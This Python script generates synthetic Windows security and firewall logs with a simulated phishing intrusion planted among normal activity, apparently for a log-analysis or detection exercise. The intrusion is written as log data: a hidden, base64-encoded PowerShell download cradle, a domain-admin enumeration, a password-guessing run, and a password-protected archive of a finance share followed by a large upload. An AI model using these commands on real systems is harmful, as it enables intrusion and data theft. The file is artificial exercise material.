"""Generate /out/wineventlog.json and /out/fw.log: 3 November 2026 at a small company, fixed seed.

Windows events reach Splunk through a Windows Event Collector (host wec-01); the machine that logged
each event is in Computer. The firewall (fw-01) logs every connection with src_ip/dest_ip.
In the middle of normal work: a phishing macro on WS-HR-07, C2 beacons, a password guess run at
it_admin on DC-01, a logon to DC-01 and FS-01, a staged archive and its upload.
"""
import json
import random
from datetime import datetime, timedelta, timezone

R = random.Random(20261103)
OUT = "/out"
DAY = datetime(2026, 11, 3, 0, 0, 0, tzinfo=timezone.utc)
WS_IP, WS = "10.40.2.57", "WS-HR-07"
C2, EXFIL = "198.51.100.23", "203.0.113.200"
win, fw = [], []
rid = [9000]


def t(h, m, s=0):
    return DAY + timedelta(hours=h, minutes=m, seconds=s)


def wt(h0=7, h1=18):
    return DAY + timedelta(seconds=R.randrange(h0 * 3600, h1 * 3600))


def ev(when, code, computer, **f):
    rid[0] += R.randint(1, 50)
    e = {"TimeCreated": when.strftime("%Y-%m-%dT%H:%M:%S+00:00"), "EventID": code, "Computer": computer + ".corp.example",
         "Channel": "Security", "EventRecordID": rid[0]}
    e.update(f)
    win.append((when, e))


def logon(when, computer, user, ltype, ip="-", ws="-"):
    ev(when, 4624, computer, TargetUserName=user, TargetDomainName="CORP", LogonType=ltype, IpAddress=ip,
       WorkstationName=ws, LogonProcessName="NtLmSsp" if ltype == 3 else "User32", AuthenticationPackageName="NTLM" if ltype == 3 else "Negotiate")


def failed(when, computer, user, ip, ws):
    ev(when, 4625, computer, TargetUserName=user, TargetDomainName="CORP", LogonType=3, IpAddress=ip, WorkstationName=ws,
       Status="0xC000006D", SubStatus="0xC000006A", FailureReason="Unknown user name or bad password.")


def proc(when, computer, user, parent, image, cmd):
    ev(when, 4688, computer, SubjectUserName=user, ParentProcessName=parent, NewProcessName=image, CommandLine=cmd)


def conn(when, src, dst, port, out, app, action="allow"):
    fw.append((when, "%s fw-01 action=%s src_ip=%s src_port=%d dest_ip=%s dest_port=%d proto=tcp bytes_out=%d app=%s" % (
        when.strftime("%Y-%m-%dT%H:%M:%SZ"), action, src, R.randrange(49152, 65535), dst, port, out, app)))


# ---- Normal work
STAFF = [("amira", "WS-FIN-02", "10.40.2.31"), ("jlee", "WS-FIN-03", "10.40.2.32"), ("pkovac", "WS-IT-01", "10.40.3.11"),
         ("sbrown", "WS-SAL-04", "10.40.2.44"), ("lhart", WS, WS_IP), ("dmorel", "WS-HR-08", "10.40.2.58")]
for user, ws, ip in STAFF:
    logon(t(8, R.randint(0, 30), R.randint(0, 59)) if user != "lhart" else t(8, 47, 12), ws, user, 2)
for _ in range(260):
    user, ws, ip = R.choice([s for s in STAFF if s[0] != "lhart"])
    logon(wt(), R.choice(["FS-01", "FS-01", "DC-01", "DC-02", "PRN-01"]), user, 3, ip, ws)
for _ in range(6):
    user, ws, ip = R.choice(STAFF[:4])
    failed(wt(), "DC-01", user, ip, ws)
# it_admin works on the DCs: replication and management from DC-02, and at the console
for _ in range(24):
    logon(wt(0, 24), "DC-01", "it_admin", 3, "10.40.0.11", "DC-02")
for _ in range(5):
    logon(wt(), "DC-01", "it_admin", 10, "-", "DC-01")
for _ in range(80):
    user, ws, ip = R.choice(STAFF)
    p = R.choice([("C:\\Windows\\explorer.exe", "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", "EXCEL.EXE /dde"),
                  ("C:\\Windows\\explorer.exe", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "chrome.exe"),
                  ("C:\\Windows\\System32\\services.exe", "C:\\Windows\\System32\\svchost.exe", "svchost.exe -k netsvcs")])
    proc(wt(), ws, user, *p)
for _ in range(420):
    user, ws, ip = R.choice(STAFF)
    dst, port, app = R.choice([("10.40.1.10", 445, "smb"), ("142.250.0.%d" % R.randint(1, 254), 443, "ssl"),
                               ("13.107.42.%d" % R.randint(1, 254), 443, "ssl"), ("10.40.1.5", 53, "dns")])
    conn(wt(), ip, dst, port, R.randint(300, 900000), app)

# ---- The incident, on and from WS-HR-07
OFFICE = "C:\\Program Files\\Microsoft Office\\root\\Office16\\"
proc(t(9, 3, 41), WS, "lhart", OFFICE + "OUTLOOK.EXE", OFFICE + "WINWORD.EXE",
     "\"WINWORD.EXE\" /n \"C:\\Users\\lhart\\Downloads\\invoice-3381.docm\"")
proc(t(9, 4, 2), WS, "lhart", OFFICE + "WINWORD.EXE", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
     "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA")
for i in range(55):
    conn(t(9, 4, 30) + timedelta(seconds=60 * i + R.randint(0, 5)), WS_IP, C2, 8080, R.randint(380, 520), "http")
proc(t(9, 40, 18), WS, "lhart", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "C:\\Windows\\System32\\net.exe",
     "net group \"Domain Admins\" /domain")
for i in range(38):
    failed(t(9, 52, 0) + timedelta(seconds=14 * i), "DC-01", "it_admin", WS_IP, WS)
logon(t(10, 2, 9), "DC-01", "it_admin", 3, WS_IP, WS)
ev(t(10, 2, 9), 4672, "DC-01", SubjectUserName="it_admin", PrivilegeList="SeBackupPrivilege SeDebugPrivilege SeTakeOwnershipPrivilege")
logon(t(10, 9, 33), "FS-01", "it_admin", 3, WS_IP, WS)
ev(t(10, 9, 33), 4672, "FS-01", SubjectUserName="it_admin", PrivilegeList="SeBackupPrivilege SeDebugPrivilege")
ev(t(10, 10, 2), 5140, "FS-01", SubjectUserName="it_admin", IpAddress=WS_IP, ShareName="\\\\*\\Finance", ShareLocalPath="D:\\Shares\\Finance")
proc(t(10, 15, 47), WS, "lhart", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "C:\\Users\\Public\\7z.exe",
     "7z.exe a -mhe=on -pWinter2026 C:\\Users\\Public\\q4-fin.7z \\\\FS-01\\Finance\\*")
conn(t(10, 31, 5), WS_IP, EXFIL, 443, 1873402211, "ssl")

with open(OUT + "/wineventlog.json", "w") as f:
    for when, e in sorted(win, key=lambda x: (x[0], x[1]["EventRecordID"])):
        f.write(json.dumps(e) + "\n")
with open(OUT + "/fw.log", "w") as f:
    for when, line in sorted(fw):
        f.write(line + "\n")
print(len(win), "windows events,", len(fw), "firewall lines")
